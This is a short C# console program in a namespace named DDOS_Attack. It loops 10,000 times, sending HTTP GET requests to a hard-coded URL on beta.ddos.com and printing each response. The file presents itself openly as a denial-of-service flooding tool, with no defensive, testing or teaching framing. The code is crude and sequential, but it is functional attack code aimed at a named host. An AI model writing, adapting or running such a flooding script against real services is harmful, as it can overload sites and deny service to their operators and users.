using Newtonsoft.Json;
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace DDOS_Attack
{
    class Program
    {
        static void Main(string[] args)
        {
            Attack();
        }

        public static async void Attack()
        {
            try
            {
                for (int i = 0; i < 10000; i++)
                {

                    Console.WriteLine(i + " - " + GetData("http://beta.ddos.com/Data/GetAll").Result.ToString());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\aError : {0}", ex.Message);
            }
        }

        public static async Task<string> GetData(string uri)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            using (HttpWebResponse response = (HttpWebResponse)await request.GetResponseAsync())
            using (Stream streaX = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(streaX))
            {
                return await reader.ReadToEndAsync();
            }
        }
    }
}

